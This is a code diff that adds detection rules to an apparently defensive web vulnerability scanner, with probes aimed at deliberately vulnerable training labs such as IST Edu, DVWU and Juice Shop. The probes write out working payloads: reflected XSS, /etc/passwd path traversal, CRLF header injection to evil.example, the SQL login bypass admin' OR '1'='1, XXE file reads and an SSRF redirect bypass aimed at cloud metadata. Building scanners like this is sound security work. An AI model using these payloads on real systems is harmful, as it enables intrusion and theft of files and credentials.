+  searchUrl.searchParams.set("q", IST_EDU_XSS_PROBE);
+  const doc = await ctx.probe.get(searchUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script>thugirXssProbe<\/script>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: searchUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "IST Edu GET /api/search?q= reflects raw <script> payload unescaped in HTML — reflected XSS route oracle"
+    }
+  };
+};
+
+const istEduNoticesLfiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:api\/notices|labs\/(?:sqli|idor|xss|csrf|ssrf))\b/i.test(pageUrl)) return NEGATIVE;
+  for (const payload of NOTICES_FILE_LFI_PAYLOADS) {
+    const url = new URL("/api/notices", ctx.origin);
+    url.searchParams.set("file", payload);
+    const doc = await ctx.probe.get(url.toString(), { maxBytes: 4096 });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    const marker = NOTICES_FILE_LFI_MARKERS.find((re) => re.test(doc.body));
+    if (!marker) continue;
+    const match = doc.body.match(marker);
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        scannedUrl: pageUrl,
+        url: url.toString(),
+        marker: match?.[0]?.slice(0, 80) || "passwd contents",
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "IST Edu GET /api/notices?file= accepts path traversal and returns /etc/passwd — LFI route oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+async function probeNewsletterCrlfInjection(ctx: RuleContext): Promise<RuleResult | null> {
+  const newsletterUrl = new URL("/api/newsletter", ctx.origin).toString();
+  const doc = await ctx.probe.get(newsletterUrl, {
+    method: "POST",
+    body: "email=test%0d%0aBcc:thugir-crlf-probe@evil.example",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (!/CRLF Injection Detected|HTTP Response Splitting/i.test(doc.body)) return null;
+  if (!/Bcc:thugir-crlf-probe@evil\.example|newline characters/i.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: newsletterUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "POST /api/newsletter with CRLF in email triggers HTTP response splitting — newsletter header injection training oracle"
+    }
+  };
+}
+
+const istEduNewsletterCrlfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/\/(?:labs\/csrf|newsletter)\b/i.test(pathname)) return NEGATIVE;
+  const result = await probeNewsletterCrlfInjection(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "IST Edu /labs/csrf or /newsletter route scan — POST /api/newsletter CRLF injection confirms HTTP response splitting / forged email header oracle"
+    }
+  };
+};
+
+const dvwuCsrfNewsletterCrlfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/csrf|newsletter)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeNewsletterCrlfInjection(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVWU /labs/csrf or /newsletter route scan — POST /api/newsletter CRLF injection confirms HTTP response splitting / forged email header oracle"
+    }
+  };
+};
+
+async function istEduVulnPortalBundleCorpus(ctx: RuleContext): Promise<string> {
+  const indexDoc = await ctx.probe.get(new URL("/", ctx.origin).toString(), {
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (indexDoc.status < 200 || indexDoc.status >= 400) return "";
+  const scriptMatch = indexDoc.body.match(/src="(\/assets\/index-[^"]+\.js)"/i);
+  if (!scriptMatch) return "";
+  const bundleDoc = await ctx.probe.get(new URL(scriptMatch[1], ctx.origin).toString(), {
+    maxBytes: 2_000_000,
+    timeoutMs: 20000
+  });
+  if (bundleDoc.status < 200 || bundleDoc.status >= 400) return "";
+  return bundleDoc.body;
+}
+
+const istEduPortalSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:api\/portal|labs\/sqli)\b/i.test(pageUrl)) return NEGATIVE;
+  const portalUrl = new URL("/api/portal", ctx.origin).toString();
+  const doc = await ctx.probe.get(portalUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin' OR '1'='1", password: "x" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Authentication Bypass Successful/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      portalUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "IST Edu POST /api/portal with admin' OR '1'='1 bypasses authentication — SQL injection login route oracle"
+    }
+  };
+};
+
+function isDvwuHost(ctx: RuleContext): boolean {
+  return /dvwu\.vercel\.app/i.test(ctx.origin);
+}
+
+const dvwuPortalSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:api\/portal|labs\/sqli)\b/i.test(pageUrl)) return NEGATIVE;
+  const portalUrl = new URL("/api/portal", ctx.origin).toString();
+  const doc = await ctx.probe.get(portalUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin' OR '1'='1", password: "x" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/Authentication Bypass Successful|SQL Injection Detected/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      portalUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "DVWU POST /api/portal with admin' OR '1'='1 bypasses authentication — SQL injection login route oracle"
+    }
+  };
+};
+
+const dvwuSearchXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/\/(?:labs\/xss|xss|search)\/?$/i.test(pathname)) return NEGATIVE;
+  const searchUrl = new URL("/api/search", ctx.origin);
+  searchUrl.searchParams.set("q", IST_EDU_XSS_PROBE);
+  const doc = await ctx.probe.get(searchUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script>thugirXssProbe<\/script>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: searchUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "DVWU GET /api/search?q= reflects raw <script> payload unescaped in HTML — reflected XSS route oracle"
+    }
+  };
+};
+
+const dvwuNoticesLfiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:api\/notices|labs\/(?:sqli|idor|xss|csrf|ssrf))\b/i.test(pageUrl)) return NEGATIVE;
+  for (const payload of NOTICES_FILE_LFI_PAYLOADS) {
+    const url = new URL("/api/notices", ctx.origin);
+    url.searchParams.set("file", payload);
+    const doc = await ctx.probe.get(url.toString(), { maxBytes: 4096 });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    const marker = NOTICES_FILE_LFI_MARKERS.find((re) => re.test(doc.body));
+    if (!marker) continue;
+    const match = doc.body.match(marker);
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        scannedUrl: pageUrl,
+        url: url.toString(),
+        marker: match?.[0]?.slice(0, 80) || "passwd contents",
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "DVWU GET /api/notices?file= accepts path traversal and returns /etc/passwd — LFI route oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+function isAllSeeingEyeHost(ctx: RuleContext): boolean {
+  return /all-seeing-eye/i.test(ctx.origin);
+}
+
+async function probeAllSeeingEyeReadXxe(ctx: RuleContext): Promise<RuleResult | null> {
+  const readUrl = new URL("/api/read", ctx.origin);
+  readUrl.searchParams.set("path", "/etc/passwd");
+  const doc = await ctx.probe.get(readUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (
+    !/<!DOCTYPE\s+p\s*\[[\s\S]*?<!ENTITY\s+data\s+SYSTEM\s+["']\/etc\/passwd["']/i.test(doc.body)
+  ) {
+    return null;
+  }
+  if (!/All-Seeing|&data;|\/etc\/passwd/i.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: readUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "GET /api/read?path= resolves external XML entity against /etc/passwd — All-Seeing Eye XXE arbitrary file read oracle"
+    }
+  };
+}
+
+async function probeAllSeeingEyeHelloXxe(ctx: RuleContext): Promise<RuleResult | null> {
+  const helloUrl = new URL("/api/hello", ctx.origin);
+  helloUrl.searchParams.set("path", "/etc/passwd");
+  const doc = await ctx.probe.get(helloUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (!/<xsl:copy-of\s+select=["']document\(['"]read\?path=/i.test(doc.body)) return null;
+  if (!/%2Fetc%2Fpasswd|\/etc\/passwd/i.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: helloUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "GET /api/hello?path= returns XSLT that chains document('read?path=') for arbitrary file read — All-Seeing Eye Chrome <116 file disclosure oracle"
+    }
+  };
+}
+
+const istEduDashboardIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/idor|dashboard)(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await istEduVulnPortalBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  if (
+    !/localStorage\.setItem\(["']student["']/i.test(bundle) ||
+    !/Grade Upload/i.test(bundle) ||
+    !/student records/i.test(bundle)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers: ["localStorage student_id", "Grade Upload", "student records"],
+      snippet: bundle.match(/Grade Upload[\s\S]{0,80}/i)?.[0]?.slice(0, 100),
+      note: "IST Edu /labs/idor or /dashboard route scan — SPA stores student session in localStorage and exposes grade-upload IDOR lab without server-side object authorization"
+    }
+  };
+};
+
+const dvwuDashboardIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/idor|dashboard)(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const bundle = await istEduVulnPortalBundleCorpus(ctx);
+  if (!bundle) return NEGATIVE;
+  if (
+    !/localStorage\.setItem\(["']student["']/i.test(bundle) ||
+    !/Grade Upload/i.test(bundle) ||
+    !/student records/i.test(bundle)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers: ["localStorage student_id", "Grade Upload", "student records"],
+      snippet: bundle.match(/student records[\s\S]{0,80}/i)?.[0]?.slice(0, 100),
+      note: "DVWU /labs/idor or /dashboard route scan — SPA stores student session in localStorage and exposes grade-upload IDOR lab without server-side object authorization"
+    }
+  };
+};
+
+const allSeeingEyeReadRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAllSeeingEyeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const result = await probeAllSeeingEyeReadXxe(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const allSeeingEyeHelloRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAllSeeingEyeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const result = await probeAllSeeingEyeHelloXxe(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const REDIRECT_SSRF_BYPASS_PAYLOAD = "//https:///google.com/%2e%2e";
+
+async function probeRedirectWhitelistBypass(ctx: RuleContext): Promise<RuleResult | null> {
+  const bypassUrl = new URL("/api/redirect", ctx.origin);
+  bypassUrl.searchParams.set("url", REDIRECT_SSRF_BYPASS_PAYLOAD);
+  const bypassDoc = await ctx.probe.get(bypassUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = bypassDoc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(bypassDoc.status)) return null;
+  if (!/^\/\/https:\/\/\/|https:\/\/https/i.test(location)) return null;
+  const blockedUrl = new URL("/api/redirect", ctx.origin);
+  blockedUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const blockedDoc = await ctx.probe.get(blockedUrl.toString(), {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (blockedDoc.status !== 403) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      bypassUrl: bypassUrl.toString(),
+      location,
+      blockedUrl: blockedUrl.toString(),
+      blockedStatus: blockedDoc.status,
+      snippet: bypassDoc.body.slice(0, 200).trim(),
+      note: "GET /api/redirect?url= accepts malformed //https:/// bypass while blocking AWS metadata — open redirect whitelist bypass SSRF oracle"
+    }
+  };
+}
+
+const istEduSsrfRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/ssrf|redirect)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeRedirectWhitelistBypass(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "IST Edu /labs/ssrf route scan — GET /api/redirect?url= accepts //https:/// whitelist bypass while blocking internal metadata — SSRF/open redirect route oracle"
+    }
+  };
+};
+
+const dvwuSsrfRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/ssrf|redirect)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeRedirectWhitelistBypass(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVWU /labs/ssrf route scan — GET /api/redirect?url= accepts //https:/// whitelist bypass while blocking internal metadata — SSRF/open redirect route oracle"
+    }
+  };
+};
+
+const vulnExposeXssPlaygroundRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnExposeHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/xss\/playground(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const spec = VULN_EXPOSE_MODULE_SPECS.find((s) => s.pathRe.test("/xss/playground"));
+  if (!spec) return NEGATIVE;
+  const result = await vulnExposeModulePageMarkers(ctx, "/xss/playground", spec);
+  if (!result.fired) return NEGATIVE;
+  const jsCorpus = await vulnExposeJsChunkCorpus(
+    ctx,
+    (await ctx.probe.get(new URL("/xss/playground", ctx.origin).toString(), { maxBytes: 65536 }))
+      .body,
+    /dangerouslySetInnerHTML|Vulnerable \(dangerouslySetInnerHTML\)/i
+  );
+  return {
+    fired: true,
+    confidence: jsCorpus ? 0.94 : result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      ...(jsCorpus
+        ? {
+            jsSnippet: jsCorpus
+              .match(/dangerouslySetInnerHTML[\s\S]{0,80}/i)?.[0]
+              ?.slice(0, 100)
+          }
+        : {}),
+      note: "VulnSite /xss/playground route scan — interactive XSS lab with dangerouslySetInnerHTML sink and reflected/stored/DOM payload panels"
+    }
+  };
+};
+
+function isVaultappHost(ctx: RuleContext): boolean {
+  return /vaultapp-omega\.vercel\.app/i.test(ctx.origin);
+}
+
+const VAULTAPP_LAB_GUIDE_MARKERS: { label: string; re: RegExp }[] = [
+  {
+    label: "VaultApp lab guide title",
+    re: /Lab Guide|Security Training Lab|OWASP API Security/i
+  },
+  {
+    label: "VaultApp finance training portal",
+    re: /Secure Personal Finance Portal|VaultApp/i
+  },
+  {
+    label: "API security challenge catalog",
+    re: /API[0-9]:|Broken Object Level Authorization|Broken Authentication|Broken Function Level Authorization|OWASP API Security Top 10/i
+  },
+  {
+    label: "Demo credentials disclosed",
+    re: /Test credentials:\s*player\s*\/\s*player123|player\s*\/\s*player123/i
+  },
+  {
+    label: "VaultApp login bundle",
+    re: /VaultApp[\s\S]{0,40}Sign in to your account|localStorage\.setItem\(["']vault_token/i
+  }
+];
+
+const vaultappLabGuideRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/lab-guide(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const guideUrl = new URL("/lab-guide", ctx.origin).toString();
+  const doc = await ctx.probe.get(guideUrl, { maxBytes: 65536, timeoutMs: 60000 });
+  const corpus = `${doc.body}\n${ctx.combined}`;
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of VAULTAPP_LAB_GUIDE_MARKERS) {
+    const m = corpus.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.92 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      guideUrl,
+      markers: hits.slice(0, 4),
+      snippet: hits[0]?.sample,
+      note: "VaultApp /lab-guide route scan — finance security training lab guide with OWASP API Top 10 challenge catalog and disclosed demo credentials"
     }
   };
 };
@@ -35843,6 +44075,8 @@ export const RULES: Record<string, Rule> = {
   fauxbankLoansRequestLiveOracle,
   fauxbankLoansNegativeAmountLiveOracle,
   fauxbankAdminPanelLiveOracle,
+  fauxbankProfileSensitiveDataLiveOracle,
+  fauxbankProfileRouteLiveOracle,
   clientSidePrototypePollutionEvidence,
   clientSideJwtNoneEvidence,
   clientSideOwaspEducationalLabEvidence,
@@ -36017,6 +44251,20 @@ export const RULES: Record<string, Rule> = {
   clientSideVulnExposeLabModuleEvidence,
   vulnExposeAuthBypassApiLiveOracle,
   vulnExposeSqliSearchApiLiveOracle,
+  vulnExposeCommentsStoredXssApiLiveOracle,
+  vulnExposeAuthBypassRouteLiveOracle,
+  vulnExposeSqliSearchRouteLiveOracle,
+  vulnExposeXssCommentsRouteLiveOracle,
+  vulnExposeCmdiRouteLiveOracle,
+  vulnExposeIdorProfileRouteLiveOracle,
+  vulnExposeBlindSqliApiLiveOracle,
+  vulnExposeSqliBlindRouteLiveOracle,
+  vulnExposeXssCspBypassRouteLiveOracle,
+  vulnExposeNetworkToolsRouteLiveOracle,
+  vulnExposeBlogStoredXssRouteLiveOracle,
+  vulnExposeInvoicesSqliRouteLiveOracle,
+  brokencrystalsUsersSearchRouteLiveOracle,
+  brokencrystalsTestimonialsRouteLiveOracle,
   vulnbankAiAnonymousChatLiveOracle,
   vulnbankBoplaRegisterLiveOracle,
   vulnbankSqliLoginLiveOracle,
@@ -36034,6 +44282,7 @@ export const RULES: Record<string, Rule> = {
   vulnbankRequestLoanNegativeAmountLiveOracle,
   vulnbankCheckBalanceIdorLiveOracle,
   brokencrystalsMarketplacePrototypePollutionLiveOracle,
+  brokencrystalsMarketplaceRouteLiveOracle,
   clientSideDragSecurityFlawsEvidence,
   clientSideDragSecurityFlawsLabModuleEvidence,
   clientSideWizerCtfEvidence,
@@ -36121,6 +44370,8 @@ export const RULES: Record<string, Rule> = {
   clientSideHtsBasicMissionLabEvidence,
   clientSideHtsPlaylevelHubEvidence,
   clientSideAuthSecurityProjectEvidence,
+  authSecurityProjectLoginSqliRouteLiveOracle,
+  authSecurityProjectDashboardXssRouteLiveOracle,
   clientSideOsCommandInjectionLabEvidence,
   clientSideWebVulnsGuideCorsLabEvidence,
   clientSideEvalFilterBypassLabEvidence,
@@ -36156,6 +44407,10 @@ export const RULES: Record<string, Rule> = {
   clientSideCsTrainingAcademyEvidence,
   clientSideHackableSoLabEvidence,
   clientSideVulnwebLabEvidence,
+  vulnwebCommentsXssRouteLiveOracle,
+  vulnwebSearchSqliRouteLiveOracle,
+  vulnwebProfileIdorRouteLiveOracle,
+  vulnwebCsrfRouteLiveOracle,
   clientSideHackingLabEvidence,
   clientSideHacksecEvidence,
   clientSideSolydTrainingEvidence,
@@ -36170,12 +44425,28 @@ export const RULES: Record<string, Rule> = {
   pwnshopChatInitEmailEnumerationLiveOracle,
   pwnshopForgotPasswordEmailEnumerationLiveOracle,
   pwnshopTrackIdorLiveOracle,
+  pwnshopTrackIdorRouteLiveOracle,
   pwnshopProductSearchSqliLiveOracle,
   pwnshopAdminLoginSqliLiveOracle,
   pwnshopChatPromptInjectionLiveOracle,
   pwnshopMassAssignmentAdminLiveOracle,
   pwnshopOpenRedirectRegisterLiveOracle,
   pwnshopVerifyOtpBruteforceLiveOracle,
+  pwnshopMailInboxIdorLiveOracle,
+  pwnshopMailIdorRouteLiveOracle,
+  pwnshopAvatarSvgXssLiveOracle,
+  pwnshopApplyCouponLiveOracle,
+  pwnshopCouponCategoryBypassLiveOracle,
+  pwnshopAvatarUploadRouteLiveOracle,
+  pwnshopApplyCouponRouteLiveOracle,
+  pwnshopCouponCategoryBypassRouteLiveOracle,
+  pwnshopSellerPreviewSstiLiveOracle,
+  pwnshopDownloadPathTraversalLiveOracle,
+  pwnshopSellerPreviewSstiRouteLiveOracle,
+  pwnshopDownloadPathTraversalRouteLiveOracle,
+  fauxbankLoansRouteLiveOracle,
+  fauxbankTransferRouteLiveOracle,
+  fauxbankAccountsRouteLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
@@ -36220,6 +44491,45 @@ export const RULES: Record<string, Rule> = {
   clientSideHermesCodexEvidence,
   clientSidePentestGroundGuardianLeaksEvidence,
   clientSidePentestGroundHubEvidence,
+  pentestGroundDvwaExecCmdiRouteLiveOracle,
+  pentestGroundDvwaCspBypassRouteLiveOracle,
+  pentestGroundDvwaSqliRouteLiveOracle,
+  pentestGroundDvwaUploadRouteLiveOracle,
+  pentestGroundDvwaCsrfRouteLiveOracle,
+  pentestGroundDvwaXssRRouteLiveOracle,
+  pentestGroundDvwaFiRouteLiveOracle,
+  pentestGroundDvwaXssDRouteLiveOracle,
+  pentestGroundDvwaJavascriptRouteLiveOracle,
+  pentestGroundDvwaOpenRedirectRouteLiveOracle,
+  theInternetLoginAuthLiveOracle,
+  theInternetLoginAuthRouteLiveOracle,
+  theInternetDynamicLoadingRouteLiveOracle,
+  theInternetBasicAuthRouteLiveOracle,
+  theInternetDownloadSecureRouteLiveOracle,
+  theInternetDropdownRouteLiveOracle,
+  theInternetJavascriptAlertsRouteLiveOracle,
+  theInternetDynamicContentRouteLiveOracle,
+  theInternetForgotPasswordRouteLiveOracle,
+  theInternetFileUploadRouteLiveOracle,
+  theInternetShadowdomRouteLiveOracle,
+  theInternetRedirectRouteLiveOracle,
+  theInternetRedirectorRouteLiveOracle,
+  theInternetStatusCodesRouteLiveOracle,
+  theInternetBrokenImagesRouteLiveOracle,
+  theInternetChallengingDomRouteLiveOracle,
+  theInternetFramesRouteLiveOracle,
+  theInternetHoversRouteLiveOracle,
+  theInternetInfiniteScrollRouteLiveOracle,
+  theInternetJqueryuiMenuRouteLiveOracle,
+  theInternetTinymceRouteLiveOracle,
+  theInternetDynamicControlsRouteLiveOracle,
+  theInternetContextMenuRouteLiveOracle,
+  theInternetNestedFramesRouteLiveOracle,
+  theInternetKeyPressesRouteLiveOracle,
+  theInternetLargeRouteLiveOracle,
+  theInternetAddRemoveElementsRouteLiveOracle,
+  pentestGroundDvwaWeakIdRouteLiveOracle,
+  pentestGroundRestflawEvalCodeInjectionRouteLiveOracle,
   clientSideJudgementDayArenaEvidence,
   clientSideCahyodVulnerableLabEvidence,
   clientSideCtfchallengeEvidence,
@@ -36264,6 +44574,8 @@ export const RULES: Record<string, Rule> = {
   vulnlabValidateSqliLiveOracle,
   vulnlabValidateXssLiveOracle,
   vulnlabValidateIdorLiveOracle,
+  vulnlabValidatePathTraversalLiveOracle,
+  vulnlabValidatePathTraversalRouteLiveOracle,
   vulnlabJwtDecodeLiveOracle,
   vulnlabAuthSessionLiveOracle,
   vulnlabAuthLoginEnumerationLiveOracle,
@@ -36299,6 +44611,29 @@ export const RULES: Record<string, Rule> = {
   clientSideVulnlabA08IntegrityEvidence,
   clientSideVulnlabA09LoggingEvidence,
   clientSideVulnlabA10SsrfEvidence,
+  ssrfVulnlabBasicLiveOracle,
+  ssrfVulnlabMetadataAwsLiveOracle,
+  ssrfVulnlabBlocklistBypassLiveOracle,
+  ssrfVulnlabRedirectLiveOracle,
+  ssrfVulnlabBasicRouteLiveOracle,
+  ssrfVulnlabMetadataAwsRouteLiveOracle,
+  ssrfVulnlabBlocklistRouteLiveOracle,
+  ssrfVulnlabRedirectRouteLiveOracle,
+  ssrfVulnlabAllowlistBypassLiveOracle,
+  ssrfVulnlabAllowlistRouteLiveOracle,
+  ssrfVulnlabSchemeLiveOracle,
+  ssrfVulnlabSchemeRouteLiveOracle,
+  ssrfVulnlabGopherLiveOracle,
+  ssrfVulnlabGopherRouteLiveOracle,
+  ssrfVulnlabParserLiveOracle,
+  ssrfVulnlabParserRouteLiveOracle,
+  ssrfVulnlabBlindLiveOracle,
+  ssrfVulnlabBlindRouteLiveOracle,
+  juiceShopJwtAlgNoneLiveOracle,
+  juiceShopChatbotApiLiveOracle,
+  juiceShopChatbotRouteLiveOracle,
+  wrongsecretsChallengeLiveOracle,
+  wrongsecretsChallengeRouteLiveOracle,
   clientSideVulnlabApiLabsEvidence,
   clientSideVulnlabCmsPlatformEvidence,
   clientSideVulnlabRubyPlatformEvidence,
@@ -36360,8 +44695,18 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsAzureMetadataSsrfLiveOracle,
   brokencrystalsDigitalOceanMetadataSsrfLiveOracle,
   brokencrystalsLdapInjectionLiveOracle,
+  brokencrystalsLdapRouteLiveOracle,
   brokencrystalsHiddenUploadLiveOracle,
+  brokencrystalsMcpToolsLiveOracle,
+  brokencrystalsMcpRouteLiveOracle,
+  brokencrystalsJwtAlgNoneLiveOracle,
+  brokencrystalsJwtRouteLiveOracle,
+  brokencrystalsDomCsrfFlowLiveOracle,
+  brokencrystalsDomCsrfRouteLiveOracle,
+  brokencrystalsNestedJsonDoSLiveOracle,
+  brokencrystalsNestedJsonRouteLiveOracle,
   brokencrystalsSecretsLiveOracle,
+  brokencrystalsSecretsRouteLiveOracle,
   brokencrystalsSafeFilesRfiLiveOracle,
   brokencrystalsUsersSearchExposureLiveOracle,
   brokencrystalsTestimonialsSqliLiveOracle,
@@ -36373,6 +44718,27 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsFileLfiLiveOracle,
   brokencrystalsMassAssignmentLiveOracle,
   brokencrystalsMassAssignmentPutLiveOracle,
+  brokencrystalsAdminpermissionRouteLiveOracle,
+  brokencrystalsFileAwsRouteLiveOracle,
+  brokencrystalsFileLfiRouteLiveOracle,
+  brokencrystalsTestimonialsCountSqliRouteLiveOracle,
+  brokencrystalsProductsLatestLimitBypassRouteLiveOracle,
+  crapiMechanicReportBolaLiveOracle,
+  crapiMechanicReportRouteLiveOracle,
+  crapiVehicleBolaLiveOracle,
+  crapiVehicleRouteLiveOracle,
+  crapiSignupOpenRegistrationLiveOracle,
+  crapiSignupRouteLiveOracle,
+  crapiOtpBruteforceLiveOracle,
+  crapiCheckOtpRouteLiveOracle,
